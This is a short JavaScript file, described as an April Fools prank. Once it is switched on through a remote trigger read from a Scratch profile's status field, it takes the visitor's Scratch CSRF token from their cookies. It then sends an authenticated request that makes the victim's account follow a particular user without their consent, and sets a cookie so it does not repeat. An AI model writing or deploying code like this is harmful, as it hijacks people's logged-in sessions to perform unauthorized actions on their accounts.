// april fools prank!

async function operationHazelnut() {
    console.log('jingleness starting')

    let status = null
    try{
        status = (await (await fetch(`https://api.scratch.mit.edu/users/tester124/?rand=${Math.random()}`)).json()).profile.status
        if(status == 'jingle blam!' || status == 'prank') {
            // its go time
        } else {
            return
        }
    }
    catch(e) {return}


    if(!(await cookieStore.get('nutcracked'))?.value || status == 'prank') {

        let status= (await fetch("https://scratch.mit.edu/site-api/users/followers/ilhp10/add/", {
            "headers": {
              "accept": "application/json, text/javascript, */*; q=0.01",
              "accept-language": "en-US,en;q=0.9",
              "content-type": "application/json",
              "sec-ch-ua": "\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
              "sec-ch-ua-mobile": "?0",
              "sec-ch-ua-platform": "\"macOS\"",
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "x-csrftoken": (await cookieStore.get("scratchcsrftoken"))?.value,
              "x-requested-with": "XMLHttpRequest"
            },
            "referrer": "https://scratch.mit.edu/users/ilhp10/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"id\":\"ilhp10\",\"userId\":5097744,\"username\":\"ilhp10\",\"thumbnail_url\":\"//uploads.scratch.mit.edu/users/avatars/5097744.png\",\"comments_allowed\":true}",
            "method": "PUT",
            "mode": "cors",
            "credentials": "include"
          })).status;
          if(status==200) {
                cookieStore.set('nutcracked',true)
          } else {

          }

    }
   
  }
  function resetYaba() {
    return cookieStore.delete('nutcracked')
  }
  
operationHazelnut()